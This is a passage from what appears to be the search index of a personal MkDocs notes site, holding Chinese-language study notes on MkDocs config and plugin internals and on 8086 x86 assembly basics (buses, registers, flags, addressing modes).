\u4e2d\u8bfb\u53d6\u8bbe\u7f6e \u5728\u8c03\u7528 load_file \u65b9\u6cd5\u65f6\u5b9e\u9645\u4e0a\u4f1a\u8bfb\u53d6 yaml \u6587\u4ef6\u5185\u5bb9\uff0c\u89e3\u6790\u6210\u5b57\u5178\u7136\u540e\u8c03\u7528 load_dict \u65b9\u6cd5\u3002\u8c03\u7528 load_dict \u65b9\u6cd5\u65f6\u5148\u5c06\u4f20\u5165\u7684\u5185\u5bb9\u76f4\u63a5\u6dfb\u52a0\u5230 user_configs \u5217\u8868\u4e2d\uff0c\u7136\u540e\u7528\u5176 update data \u5c5e\u6027","title":"\u521b\u5efa Config\u3001\u8f7d\u5165\u914d\u7f6e"},{"location":"cs/analysis/mkdocs/#config_1","text":"\u8c03\u7528 Config.validate \u9a8c\u8bc1\u6709\u4ee5\u4e0b\u51e0\u6b65\uff1a \u8c03\u7528 _pre_validate() \u65b9\u6cd5 \u5176\u4f1a\u904d\u5386 _schema \u6bcf\u4e00\u4e2a\u952e\u503c\u5bf9\uff0c\u8c03\u7528 config_option \u4e0a\u7684 pre_validation \u65b9\u6cd5\uff0c\u5177\u4f53\u7531\u5b9e\u9645\u5b50\u7c7b\u8fdb\u884c\u5b9e\u73b0 \u8c03\u7528 _validate() \u65b9\u6cd5 \u4e5f\u4f1a\u904d\u5386 _schema \u6bcf\u4e00\u4e2a\u952e\u503c\u5bf9\uff0c\u4f46\u6b64\u65f6\u4f1a\u5c06\u952e\u5728 config \u4e2d\u5bf9\u5e94\u7684\u503c\u4f20\u5165 config_option \u7684 validate \u65b9\u6cd5\uff08\u7531\u5b50\u7c7b\u7684 run_validation \u65b9\u6cd5\u5b9e\u73b0\uff0c\u8fd4\u56de\u4e00\u4e2a\u4fee\u6b63\u540e\u7684\u503c\uff0c\u91cd\u65b0\u8d4b\u503c\u56de\u6765 \u9664\u6b64\u4e4b\u5916\u8fd8\u4f1a\u68c0\u67e5\u4e0d\u5728 _schema_keys \u4e2d\u7684\u952e\uff0c\u5e76\u629b\u51fa\u8b66\u544a \u5982\u679c\u524d\u9762\u90fd\u6ca1\u6709\u51fa\u73b0 error\uff0c\u5219\u8c03\u7528 _post_validate \u65b9\u6cd5 \u540c pre\uff0c\u53ea\u4e0d\u8fc7\u5bf9 config_option \u8c03\u7528\u7684\u65b9\u6cd5\u4ece pre \u6362\u6210\u4e86 post \u5177\u4f53\u7684\u5404\u4e2a\u53c2\u6570\u7684\u5b9a\u4e49\u548c\u9a8c\u8bc1\u65b9\u6cd5\u90fd\u5728 config/config_options.py \u4e2d\uff0c\u5f88\u8be6\u7ec6\u6613\u61c2","title":"\u9a8c\u8bc1 Config"},{"location":"cs/analysis/mkdocs/#plugin","text":"\u5728\u524d\u9762 ConfigOptions \u4e2d\u6709\u4e00\u4e2a Plugins \u5b50\u7c7b\uff0c\u6765\u5b58\u653e\u63d2\u4ef6\u76f8\u5173\u5bf9\u8c61\uff0c\u5176\u521d\u59cb\u5316\u65f6\u4f1a\u8c03\u7528 plugins.get_plugins() \u51fd\u6570\u6765\u5168\u5c40\u68c0\u67e5\u5b89\u88c5\u7684\u5305\u7684 entry_points \u662f\u5426\u542b\u6709 mkdocs.plugins\uff0c\u6765\u5f97\u5230\u4e00\u4e2a Dict[str, EntryPoint] \u7c7b\u578b\u7684 installed_plugins \u5c5e\u6027\uff08\u5373\u901a\u8fc7\u5305\u540d\u6620\u5c04\u5230\u63d2\u4ef6\u5165\u53e3\u70b9\uff0c\u5373\u63d2\u4ef6\u7c7b\uff09 \u8fd9\u4e2a Plugins \u7c7b\u5728\u4e0a\u9762\u6240\u8bf4\u7684 run_validation \u8fc7\u7a0b\u4e2d\u4f1a\u5c06\u63d2\u4ef6\u540d\u4f20\u5165 load_plugin \u65b9\u6cd5\uff08\u91cc\u9762\u4f1a\u68c0\u67e5\u662f\u5426\u5b89\u88c5\u7b49\u4e00\u7cfb\u5217\u95ee\u9898\uff09\uff0c\u5e76\u8fd4\u56de\u5f97\u5230\u63d2\u4ef6\u7c7b\uff0c\u7edf\u4e00\u6536\u96c6\u5230 plugins.PluginCollection \u7c7b\u4e2d\u3002 \u5728\u4e3a PluginCollection setitem \u7684\u65f6\u5019\u4f1a\u5c06\u63d2\u4ef6\u7684\u6240\u6709 on_ \u5f00\u5934\u7684\u65b9\u6cd5\u90fd\u6ce8\u518c\u4e3a event\uff08\u5982 on_startup \u65b9\u6cd5\u4f1a\u6ce8\u518c\u4e00\u4e2a\u540d\u4e3a startup \u7684 event\uff09\uff0c\u5728\u8c03\u7528 run_event(\"startup\") \u7684\u65f6\u5019\u4f1a\u8c03\u7528\u6240\u6709\u6709 on_startup \u65b9\u6cd5\u7684\u63d2\u4ef6\u7684\u8fd9\u4e00\u65b9\u6cd5\uff0c\u4ece\u800c\u6267\u884c\u63d2\u4ef6\u81ea\u5b9a\u4e49\u7684\u521d\u59cb\u5316\u4ee3\u7801\uff08\u540c\u65f6\u53ef\u4ee5\u6839\u636e\u4f20\u5165\u7684 command\uff0c\u5982 \"build\"\u3001\"gh-deploy\"\u3001\"serve\" \u6765\u7279\u5224\u6267\u884c\u4e0d\u540c\u52a8\u4f5c\uff09","title":"\u89e6\u53d1 Plugin \u4e8b\u4ef6"},{"location":"cs/analysis/mkdocs/#build_1","text":"","title":"\u8c03\u7528 build \u51fd\u6570\u6784\u5efa\u6587\u6863"},{"location":"cs/pl/","text":"Programming Language & ISA \u00b6 Abstract \u8fd9\u91cc\u5f52\u6863\u4e00\u4e9b\u5b66\u4e60\u7f16\u7a0b\u8bed\u8a00\u65f6\u7684\u7b14\u8bb0 \u6709\u7684\u662f\u7cfb\u7edf\u7684\u5b66\u4e60\u7b14\u8bb0\uff08\u6bd4\u5982 Haskell\uff09\uff0c\u6709\u7684\u662f\u96f6\u96f6\u6563\u6563\u7684\u77e5\u8bc6\u70b9 \u800c\u4e14\u8fd8\u6709\u4e00\u4e9b\u8bed\u8a00\u6ca1\u5199\u7b14\u8bb0\uff08\u9003 Table of Contents \u00b6 Python Python \u8bed\u6cd5\u57fa\u7840 Rust Rust \u57fa\u7840 Rust \u6742\u9879 C/C++ Haskell x86 Assembly RISC-V ISA RISC-V \u975e\u7279\u6743\u7ea7 ISA RISC-V \u7279\u6743\u7ea7 ISA","title":"Programming Language & ISA"},{"location":"cs/pl/#programming-language-isa","text":"Abstract \u8fd9\u91cc\u5f52\u6863\u4e00\u4e9b\u5b66\u4e60\u7f16\u7a0b\u8bed\u8a00\u65f6\u7684\u7b14\u8bb0 \u6709\u7684\u662f\u7cfb\u7edf\u7684\u5b66\u4e60\u7b14\u8bb0\uff08\u6bd4\u5982 Haskell\uff09\uff0c\u6709\u7684\u662f\u96f6\u96f6\u6563\u6563\u7684\u77e5\u8bc6\u70b9 \u800c\u4e14\u8fd8\u6709\u4e00\u4e9b\u8bed\u8a00\u6ca1\u5199\u7b14\u8bb0\uff08\u9003","title":"Programming Language &amp; ISA"},{"location":"cs/pl/#table-of-contents","text":"Python Python \u8bed\u6cd5\u57fa\u7840 Rust Rust \u57fa\u7840 Rust \u6742\u9879 C/C++ Haskell x86 Assembly RISC-V ISA RISC-V \u975e\u7279\u6743\u7ea7 ISA RISC-V \u7279\u6743\u7ea7 ISA","title":"Table of Contents"},{"location":"cs/pl/asm/","text":"x86 \u6c47\u7f16\u8bed\u8a00 \u00b6 Abstract \u81ea\u5b66\uff0c\u770b\u4e66\u300a\u6c47\u7f16\u8bed\u8a00\uff08\u7b2c4\u7248\uff09\u300b\u738b\u723d \u6d59\u6c5f\u5927\u5b66\u767d\u6d2a\u6b22\u8001\u5e08 \u201c\u6c47\u7f16\u8bed\u8a00\u201d\uff08\u5927\u4e00\u6625\u590f\uff09\u8bfe\u7a0b https://faydoc.tripod.com/cpu/index.htm \u57fa\u7840\u77e5\u8bc6 \u00b6 \u4e00\u4e9b\u4ec5\u4f9b\u4e86\u89e3\u7684\u4e1c\u897f \u673a\u5668\u8bed\u8a00\uff1a\u673a\u5668\u6307\u4ee4\uff08\u4e8c\u8fdb\u5236\u6570\uff09\u7684\u96c6\u5408 CPU \u53ef\u4ee5\u6267\u884c\u673a\u5668\u6307\u4ee4\uff0c\u8fdb\u884c\u8fd0\u7b97 \u6c47\u7f16\u8bed\u8a00\u4e3b\u4f53\u662f\u6c47\u7f16\u6307\u4ee4\uff0c\u6c47\u7f16\u6307\u4ee4\u901a\u8fc7\u7f16\u8bd1\u5668\u7f16\u8bd1\u4e3a\u673a\u5668\u7801\u7ed9\u8ba1\u7b97\u673a\u6267\u884c \u5bc4\u5b58\u5668\uff1aCPU \u4e2d\u53ef\u4ee5\u5b58\u50a8\u6570\u636e\u7684\u5668\u4ef6 \u6c47\u7f16\u8bed\u8a00\u7ec4\u6210\uff1a \u6c47\u7f16\u6307\u4ee4\uff1a\u6709\u5bf9\u5e94\u7684\u673a\u5668\u7801\uff0c\u662f\u673a\u5668\u7801\u7684\u52a9\u8bb0\u7b26 \u4f2a\u6307\u4ee4\uff1a\u7531\u7f16\u8bd1\u5668\u6267\u884c\uff0c\u6ca1\u6709\u5bf9\u5e94\u673a\u5668\u7801 \u5176\u4ed6\u7b26\u53f7\uff08+-*/\u7b49\uff09\uff1a\u7531\u7f16\u8bd1\u5668\u8bc6\u522b\uff0c\u6ca1\u6709\u5bf9\u5e94\u673a\u5668\u7801 \u6307\u4ee4\u548c\u6570\u636e\u5728\u5185\u5b58\u4e2d\u5b58\u653e\uff0c\u88ab CPU \u4f7f\u7528 \u6307\u4ee4\u548c\u6570\u636e\u5728\u5185\u5b58\u4e2d\u6ca1\u6709\u533a\u522b\uff0c\u90fd\u662f\u4e8c\u8fdb\u5236\u4fe1\u606f \u8ba1\u7b97\u673a\u6700\u5c0f\u4fe1\u606f\u5355\u4f4d\u662f bit\uff0c8 \u4e2a bit \u7ec4\u6210\u4e00\u4e2a Byte\uff0c\u4e00\u4e2a\u5b58\u50a8\u5355\u5143\u53ef\u4ee5\u5b58\u50a8\u4e00\u4e2a Byte\uff088 \u4e2a\u4e8c\u8fdb\u5236\u4f4d\uff09\uff0c\u5b58\u50a8\u5355\u5143\u4ece 0 \u5f00\u59cb\u7f16\u53f7 CPU \u901a\u8fc7\u603b\u7ebf\u4e0e\u5b58\u50a8\u5668\u82af\u7247\u4f20\u8f93\u5730\u5740\u3001\u6570\u636e\u3001\u63a7\u5236\u4fe1\u606f\uff08\u603b\u7ebf\uff1a\u8fde\u63a5 CPU \u548c\u5176\u4ed6\u82af\u7247\u7684\u4e00\u5806\u5bfc\u7ebf\uff09 CPU \u4ece\u5185\u5b58\u8bfb\u53d6\u6570\u636e\u7684\u8fc7\u7a0b\uff1a CPU \u901a\u8fc7\u5730\u5740\u7ebf\u5c06\u5730\u5740\u4fe1\u606f\u53d1\u51fa CPU \u901a\u8fc7\u63a7\u5236\u7ebf\u53d1\u51fa\u5185\u5b58\u8bfb\u547d\u4ee4\uff0c\u544a\u77e5\u6307\u5b9a\u5b58\u50a8\u5668\u82af\u7247\u8981\u4ece\u4e2d\u8bfb\u53d6\u6570\u636e \u5b58\u50a8\u5668\u5c06\u6240\u9700\u5730\u5740\u5904\u7684\u6570\u636e\u901a\u8fc7\u6570\u636e\u7ebf\u9001\u7ed9 CPU CPU \u901a\u8fc7 \u5730\u5740\u603b\u7ebf \u6307\u5b9a\u5b58\u50a8\u5355\u5143\u3002\u5730\u5740\u603b\u7ebf\u4e0a\u80fd\u4f20\u9001\u591a\u5c11\u4e2a\u4e0d\u540c\u7684\u4fe1\u606f\uff0cCPU \u5c31\u53ef\u4ee5\u5bf9\u591a\u5c11\u4e2a\u5b58\u50a8\u5355\u5143\u8fdb\u884c\u5bfb\u5740 \u4e00\u4e2a CPU \u6709 n \u6839\u5730\u5740\u7ebf\uff0c\u5219\u8fd9\u4e2a CPU \u7684\u5730\u5740\u603b\u7ebf\u5bbd\u5ea6\u4e3a n\uff0c\u8fd9\u6837\u7684 CPU \u6700\u591a\u53ef\u4ee5\u5bfb\u627e 2 n \u4e2a\u5185\u5b58\u5355\u5143 CPU \u901a\u8fc7 \u6570\u636e\u603b\u7ebf \u6765\u4e0e\u5185\u5b58\u6216\u5176\u4ed6\u5668\u4ef6\u4e4b\u95f4\u4f20\u9001\u6570\u636e\u3002\u6570\u636e\u603b\u7ebf\u7684\u5bbd\u5ea6\u51b3\u5b9a\u4e86 CPU \u4e0e\u5916\u754c\u7684\u6570\u636e\u4f20\u9001\u901f\u5ea6 8 \u6839\u6570\u636e\u603b\u7ebf\u4e00\u6b21\u53ef\u4ee5\u4f20\u9001\u4e00\u4e2a 8 \u4e3a\u4e8c\u8fdb\u5236\u6570\u636e\uff081 \u4e2a\u5b57\u8282\uff09\uff0c16 \u6839\u6570\u636e\u603b\u7ebf\u4e00\u6b21\u53ef\u4ee5\u4f20\u9001\u4e24\u4e2a\u5b57\u8282 8088 CPU \u7684\u6570\u636e\u603b\u7ebf\u5bbd\u5ea6\u4e3a 8\uff0c8086 CPU \u7684\u6570\u636e\u603b\u7ebf\u5bbd\u5ea6\u4e3a 16 CPU \u901a\u8fc7\u63a7\u5236\u603b\u7ebf\u5bf9\u5916\u90e8\u5668\u4ef6\u8fdb\u884c\u63a7\u5236\u3002\u63a7\u5236\u603b\u7ebf\u7684\u5bbd\u5ea6\u51b3\u5b9a\u4e86 CPU \u5bf9\u5916\u90e8\u5668\u4ef6\u7684\u63a7\u5236\u80fd\u529b \u4e3b\u677f\u4e0a\u5668\u4ef6\u901a\u8fc7\u603b\u7ebf\u548c CPU \u76f8\u8fde CPU \u901a\u8fc7\u63d2\u5728\u6269\u5c55\u63d2\u69fd\u4e0a\u7684\u63a5\u53e3\u5361\u95f4\u63a5\u63a7\u5236\u5916\u8bbe \u5b58\u50a8\u5668\u82af\u7247\u4ece\u8bfb\u5199\u4e0a\u5206\u4e3a \u968f\u673a\u5b58\u50a8\u5668\uff08RAM\uff09\u548c \u53ea\u8bfb\u5b58\u50a8\u5668\uff08ROM\uff09 RAM \u53ef\u8bfb\u53ef\u5199\uff0c\u4f46\u5fc5\u987b\u5e26\u7535\u5b58\u50a8\uff0c\u5173\u673a\u540e\u5185\u5bb9\u4e22\u5931 ROM \u53ea\u8bfb\u4e0d\u5199\uff0c\u4f46\u5173\u673a\u540e\u5185\u5bb9\u4e0d\u4e22\u5931 \u5b58\u50a8\u5668\u4ece\u529f\u80fd\u548c\u8fde\u63a5\u4e0a\u5206\u4e3a\uff1a \u968f\u673a\u5b58\u50a8\u5668\uff1a\u5b58\u653e\u4f9b CPU \u4f7f\u7528\u7684\u7edd\u5927\u90e8\u5206\u7a0b\u5e8f\u548c\u6570\u636e\uff0c\u7531\u88c5\u5728\u4e3b\u677f\u4e0a\u7684 RAM \u548c\u63d2\u5728\u6269\u5c55\u63d2\u69fd\u4e0a\u7684 RAM \u7ec4\u6210 \u88c5\u6709 BIOS \u7684 ROM\uff1a\u5382\u5546\u63d0\u4f9b\u7684\u8f6f\u4ef6\u7cfb\u7edf\uff0c\u901a\u8fc7\u5b83\u5229\u7528\u8be5\u786c\u4ef6\u8bbe\u5907\u8fdb\u884c\u6700\u57fa\u672c\u7684\u8f93\u5165\u8f93\u51fa \u63a5\u53e3\u5361\u4e0a\u7684 RAM\uff1a\u67d0\u4e9b\u63a5\u53e3\u5361\u9700\u8981\u5bf9\u5927\u6279\u91cf\u8f93\u5165\u3001\u8f93\u51fa\u6570\u636e\u8fdb\u884c\u6682\u65f6\u5b58\u50a8\uff0c\u5728\u5176\u4e0a\u88c5\u6709 RAM\uff08\u5982\u663e\u5b58\uff09 CPU \u5728\u64cd\u63a7\u5b58\u50a8\u5668\u7684\u65f6\u5019\uff0c\u628a\u5b83\u4eec\u5f53\u4f5c\u5185\u5b58\u6765\u5bf9\u5f85\uff0c\u628a\u5b83\u4eec\u603b\u7684\u770b\u4f5c\u4e00\u4e2a\u7531\u82e5\u5e72\u5b58\u50a8\u5355\u5143\u7ec4\u6210\u7684\u903b\u8f91\u5b58\u50a8\u5668\uff0c\u5373\u5185\u5b58\u5730\u5740\u7a7a\u95f4 \u6240\u6709\u7269\u7406\u5b58\u50a8\u5668\u88ab\u770b\u4f5c\u4e00\u4e2a\u7531\u82e5\u5e72\u5b58\u50a8\u5355\u5143\u7ec4\u6210\u7684\u903b\u8f91\u5b58\u50a8\u5668\uff0c\u6bcf\u4e2a\u7269\u7406\u5b58\u50a8\u5668\u5728\u5176\u4e2d\u5360\u6709\u4e00\u4e2a\u5730\u5740\u6bb5\uff0c\u5373\u5730\u5740\u7a7a\u95f4 \u6570\u636e\u7684\u8868\u793a\u4e0e\u7ec4\u7ec7 \u00b6 \u4e8c\u8fdb\u5236\u6570\u672b\u5c3e\u7528 B/b \u4f5c\u540e\u7f00\uff0c\u5341\u516d\u8fdb\u5236\u672b\u5c3e\u7528 H/h \u4f5c\u540e\u7f00\u4e14\u5982\u679c\u5f00\u5934\u4e3a\u5b57\u6bcd\u5219\u8981\u5728\u524d\u9762\u52a0\u4e00\u4e2a 0\uff0c\u516b\u8fdb\u5236\u672b\u5c3e\u7528 Q/q \u4f5c\u540e\u7f00\uff0c\u5341\u8fdb\u5236\u4e0d\u7528\u540e\u7f00 \u4e00\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u53eb\u4e00\u4f4d\uff08bit\uff09\uff0c\u56db\u4e2a\u4f4d\u53eb\u4e00\u4e2a\u534a\u5b57\u8282\uff08nibble\uff09\uff0c\u516b\u4e2a\u4f4d\u53eb\u4e00\u4e2a\u5b57\u8282\uff08byte\uff09\uff0c\u5341\u516d\u4e2a\u4f4d\u53eb\u4e00\u4e2a\u5b57\uff08word\uff09\uff0c\u4e09\u5341\u4e8c\u4e2a\u4f4d\u53eb\u4e00\u4e2a\u53cc\u5b57\uff08double word\uff09 \u5b57\u7b26\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u5355\u5f15\u53f7\u62ec\u5b57\u7b26\u6765\u8868\u793a\uff0c\u4e5f\u53ef\u4ee5\u7528\u5bf9\u5e94 ASCII \u7801\u6765\u8868\u793a \u5185\u90e8\u5bc4\u5b58\u5668 \u00b6 8086 \u5185\u90e8\u4e00\u5171\u6709 14 \u4e2a 16 \u4f4d\u5bc4\u5b58\u5668\uff0c8 \u4e2a\u901a\u7528\u5bc4\u5b58\u5668\uff0c4 \u4e2a\u6bb5\u5bc4\u5b58\u5668\uff0c2 \u4e2a\u63a7\u5236\u5bc4\u5b58\u5668 \u901a\u7528\u5bc4\u5b58\u5668 \u6570\u636e\u5bc4\u5b58\u5668\uff1aax bx cx dx\uff0c\u7528\u4e8e\u5b58\u653e\u6570\u636e\u3002\u6bcf\u4e2a\u5bc4\u5b58\u5668\u4e3a 16 \u4f4d\uff0c\u53ef\u5206\u4e3a\u9ad8\u4f4e 8 \u4f4d\uff0c\u9ad8 8 \u4f4d\u5206\u522b\u4e3a ah bh ch dh\uff0c\u4f4e\u516b\u4f4d\u5206\u522b\u4e3a al bl cl dl\uff0c\u4e14\u5982\u679c\u53ea\u4fee\u6539\u516b\u4f4d\uff0c\u5219\u4e0d\u4f1a\u5f71\u54cd\u5230\u53e6\u5916\u516b\u4f4d\uff08\u6bd4\u5982\u6ea2\u51fa\u4e0d\u4f1a\u4ece al \u6ea2\u51fa\u5230 ah\uff09 ax\uff1a\u7d2f\u52a0\u5668\uff0c\u5e38\u7528\u4f5c\u7d2f\u52a0\uff0c\u4e14\u5728\u4e58\u9664\u6cd5\u3001\u4e32\u8fd0\u7b97\u3001IO \u4e2d\u6709\u4e13\u95e8\u7528\u5904 bx\uff1a\u57fa\u5740\u5bc4\u5b58\u5668\uff0c\u5e38\u7528\u6765\u5b58\u653e\u5bfb\u5740\u7684\u57fa\u5740 cx\uff1a\u8ba1\u6570\u5bc4\u5b58\u5668\uff0c\u5e38\u7528\u5728\u5faa\u73af\u4e2d\u4f5c\u4e3a\u8ba1\u6570\u5668 dx\uff1a\u6570\u636e\u5bc4\u5b58\u5668\uff0c\u5b58\u653e IO \u7aef\u53e3\u5730\u5740\uff0c\u4e14\u5728\u53cc\u5b57\u8fd0\u7b97\u4e2d\u4f5c\u4e3a ax \u7684\u6269\u5c55\u9ad8\u5341\u516d\u4f4d \u53d8\u5740\u5bc4\u5b58\u5668\uff1asi di\uff0c\u5e38\u7528\u6765\u5bfb\u5740 si\uff1a\u6e90\u53d8\u5740\u5bc4\u5b58\u5668 di\uff1a\u76ee\u7684\u53d8\u5740\u5bc4\u5b58\u5668 \u6307\u9488\u5bc4\u5b58\u5668\uff1asp bp\uff0c\u5e38\u4e0e ss \u6784\u6210\u8fdc\u6307\u9488 sp\uff1a\u5806\u6808\u6307\u9488\u5bc4\u5b58\u5668\uff0css:sp \u6307\u5411\u5806\u6808\u9876\u7aef bp\uff1a\u57fa\u5740\u6307\u9488\u5bc4\u5b58\u5668\uff0c\u5e38\u7528 ss:bp \u6307\u5411\u5806\u6808\u4e2d\u6570\u636e \u6bb5\u5bc4\u5b58\u5668\uff1acs ss ds es cs\uff1a\u4ee3\u7801\u6bb5\u5bc4\u5b58\u5668\uff0c\u5b58\u653e\u4ee3\u7801\u6bb5\u7684\u6bb5\u5730\u5740 ss\uff1a\u5806\u6808\u6bb5\u5bc4\u5b58\u5668\uff0c\u5b58\u653e\u5806\u6808\u6bb5\u7684\u6bb5\u5730\u5740 ds\uff1a\u6570\u636e\u6bb5\u5bc4\u5b58\u5668\uff0c\u5b58\u653e\u6570\u636e\u6bb5\u7684\u6bb5\u5730\u5740 es\uff1a\u9644\u52a0\u6570\u636e\u6bb5\u5bc4\u5b58\u5668\uff0c\u5b58\u653e\u9644\u52a0\u6570\u636e\u6bb5\u6bb5\u5730\u5740 \u63a7\u5236\u5bc4\u5b58\u5668\uff1aip fl ip\uff1a\u6307\u4ee4\u6307\u9488\u5bc4\u5b58\u5668\uff0c\u5b58\u653e\u4ee3\u7801\u6bb5\u7684\u504f\u79fb\u5730\u5740\uff0c cs:ip \u6307\u5411\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u9996\u5b57\u8282\uff0c\u4e0d\u80fd\u76f4\u63a5\u8bbf\u95ee ip fl\uff1a\u6807\u5fd7\u5bc4\u5b58\u5668\uff0c16 \u4f4d\u4f46\u53ea\u4f7f\u7528 9 \u4f4d\u8868\u793a 6 \u4e2a\u72b6\u6001\u6807\u5fd7\u548c 3 \u4e2a\u63a7\u5236\u6807\u5fd7\uff08df if tf\uff09 of\uff1aoverflow flag \u6ea2\u51fa\u6807\u5fd7\uff0c\u7b2c 11 \u4f4d\uff0c\u8868\u793a\u8fd0\u7b97\u662f\u5426\u6ea2\u51fa df\uff1adirection flag \u65b9\u5411\u6807\u5fd7\uff0c\u7b2c 10 \u4f4d\uff0c\u6807\u5fd7\u5b57\u7b26\u4e32\u5904\u7406\u6307\u4ee4\u4e2d\u5904\u7406\u4fe1\u606f\u7684\u65b9\u5411 if\uff1ainterrupt flag \u4e2d\u65ad\u6807\u5fd7\uff0c\u7b2c 9 \u4f4d\uff0c\u662f\u5426\u5141\u8bb8\u5916\u90e8\u786c\u4ef6\u4e2d\u65ad tf\uff1atrace flag \u8ddf\u8e2a\u6807\u5fd7\uff0c\u7b2c 8 \u4f4d\uff0cCPU \u662f\u5426\u8fdb\u5165\u5355\u6b65\u5de5\u4f5c\u72b6\u6001 sf\uff1asign flag \u7b26\u53f7\u6807\u5fd7\uff0c\u7b2c 7 \u4f4d\uff0c\u8fd0\u7b97\u7ed3\u679c\u7684\u7b26\u53f7\uff081 \u8868\u793a\u8d1f\uff09 zf\uff1azero flag \u96f6\u6807\u5fd7\uff0c\u7b2c 6 \u4f4d\uff0c\u8fd0\u7b97\u7ed3\u679c\u662f\u5426\u4e3a 0 af\uff1aauxiliary carry flag \u8f85\u52a9\u8fdb\u4f4d\u6807\u5fd7\uff0c\u7b2c 4 \u4f4d\uff0c\u8bb0\u5f55\u8fd0\u7b97\u65f6\u7b2c\u4e09\u4f4d\u662f\u5426\u5411\u5de6\u4fa7\u4ea7\u751f\u8fdb\u501f\u4f4d pf\uff1aparity flag \u5947\u5076\u6807\u5fd7\uff0c\u7b2c 2 \u4f4d\uff0c\u7ed3\u679c\u64cd\u4f5c\u6570\u4e2d\u4f4e 8 \u4f4d 1 \u7684\u4e2a\u6570\u662f\u5426\u4e3a\u5076\u6570 cf\uff1acarry flag \u8fdb\u4f4d\u6807\u5fd7\uff0c\u7b2c 0 \u4f4d\uff0c\u8fd0\u7b97\u65f6\u6700\u9ad8\u4f4d\u662f\u5426\u5411\u5de6\u4fa7\u6709\u8fdb\u501f\u4f4d 80386 32 \u4f4d\u5bc4\u5b58\u5668\u4e00\u5171\u6709 16 \u4e2a \u901a\u7528\u5bc4\u5b58\u5668 eax ebx ecx edx\uff0c\u53ef\u4ee5\u4f7f\u7528\u4f8b\u5982 ax \u8868\u793a\u4f4e 16 \u4f4d\uff0cah al \u5206\u522b\u8868\u793a\u4f4e 16 \u4f4d\u4e2d\u7684\u9ad8\u4f4e 8 \u4f4d esi edi\uff0c\u4f4e 16 \u4f4d\u4e3a si di esp ebp\uff0c\u4f4e 16 \u4f4d\u4e3a sp bp \u6bb5\u5bc4\u5b58\u5668\uff1acs ss ds es fs gs\uff08\u591a\u4e86\u4e24\u4e2a\u9644\u52a0\u6570\u636e\u6bb5\u5bc4\u5b58\u5668\uff09 \u63a7\u5236\u5bc4\u5b58\u5668\uff1aeip eflags 8086 \u5185\u5b58\u7ec4\u7ec7 \u00b6 \u53ef\u8bbf\u95ee\u7684\u5185\u5b58\u4e00\u5171\u6709 1MB\uff0c\u5341\u516d\u8fdb\u5236\u8868\u793a\u4e3a 00000h~FFFFFh\uff0c\u8fd9\u6837\u7528 20 \u4f4d\u8868\u793a\u7684\u5730\u5740\u79f0\u4e3a\u7269\u7406\u5730\u5740 \u5bfb\u5740\u65f6\u4f7f\u7528\u7684\u662f \u6bb5\u5730\u5740:\u504f\u79fb\u5730\u5740 \u5f62\u5f0f\u7684\u903b\u8f91\u5730\u5740\uff0c\u5bf9\u5e94\u7684\u7269\u7406\u5730\u5740\u4e3a \u6bb5\u5730\u5740*16+\u504f\u79fb\u5730\u5740\uff0c\u6c47\u7f16\u91cc\u5199\u6210 \u6bb5\u5730\u5740:[\u504f\u79fb\u5730\u5740]\u3002\u540c\u6837\u4e5f\u5bb9\u6613\u770b\u51fa\u4e00\u4e2a\u5b58\u50a8\u5355\u5143\u5bf9\u5e94\u7684\u903b\u8f91\u5730\u5740\u8868\u793a\u5e76\u4e0d\u552f\u4e00 \u6307\u4ee4\u7cfb\u7edf\u4e0e\u5bfb\u5740\u65b9\u5f0f \u00b6 \u6c47\u7f16\u6307\u4ee4\u4e00\u822c\u7531\u64cd\u4f5c\u7801\uff08opcode\uff09\u548c\u64cd\u4f5c\u6570\uff08operand\uff09\u6784\u6210\uff0c\u4efb\u4f55\u6307\u4ee4\u90fd\u6709\u64cd\u4f5c\u7801\uff0c\u64cd\u4f5c\u6570\u7684\u4e2a\u6570\u4e0d\u4e00\u5b9a \u64cd\u4f5c\u6570\u5bfb\u5740\u65b9\u5f0f \u00b6 \u7acb\u5373\u6570\u65b9\u5f0f \uff1a\u5373\u64cd\u4f5c\u6570\u4e3a\u5e38\u6570 \u5bc4\u5b58\u5668\u65b9\u5f0f \uff1a\u4ee5\u5bc4\u5b58\u5668\u4e3a\u64cd\u4f5c\u6570 \u76f4\u63a5\u5bfb\u5740 \uff1a\u901a\u8fc7\u903b\u8f91\u5730\u5740\u8868\u793a\u64cd\u4f5c\u6570\uff0c\u4e14\u504f\u79fb\u5730\u5740\u4e3a\u7acb\u5373\u6570\uff0c\u6bd4\u5982 [1234h]\u3001ss:[1234h]\uff0c\u7701\u7565\u60c5\u51b5\u9ed8\u8ba4 ds \u95f4\u63a5\u5bfb\u5740 \uff1a\u903b\u8f91\u5730\u5740\u7684\u504f\u79fb\u5730\u5740\u4ee5\u95f4\u63a5\u5f62\u5f0f\u8868\u793a\uff0c\u65b9\u62ec\u53f7\u5185\u53ea\u80fd\u662f bx bp si di\uff0c\u4e14\u8868\u793a\u4e3a \u57fa\u5740\u5bc4\u5b58\u5668\uff08bx bp \u9009\u5176\u4e00\u6216\u6ca1\u6709\uff09+ \u53d8\u5740\u5bc4\u5b58\u5668\uff08si di \u9009\u5176\u4e00\u6216\u6ca1\u6709\uff09+ \u4f4d\u79fb\u91cf\uff08\u7acb\u5373\u6570\u6216\u6ca1\u6709\uff09\u7684\u5f62\u5f0f \u5373 bx bp \u4e0d\u80fd\u540c\u65f6\u51fa\u73b0\uff0csi di \u4e0d\u80fd\u540c\u65f6\u51fa\u73b0 \u7701\u7565\u6bb5\u5730\u5740\u65f6\uff0c\u5982\u679c\u504f\u79fb\u5730\u5740\u5185\u6709 bp \u51fa\u73b0\uff0c\u5219\u7f3a\u7701\u6bb5\u5730\u5740\u4e3a ss\uff0c\u5176\u5b83\u60c5\u51b5\u5747\u4e3a ds \u6bb5\u5730\u5740\u4e0d\u80fd\u662f\u7acb\u5373\u6570\uff0c\u4e00\u822c\u9664 cs ss ds \u5916\u7684\u5176\u5b83\u6bb5\u5730\u5740\u9884\u5148\u5b58\u5728 es \u4e2d\u518d\u5bfb\u5740 8086 \u6c47\u7f16\u6307\u4ee4 \u00b6 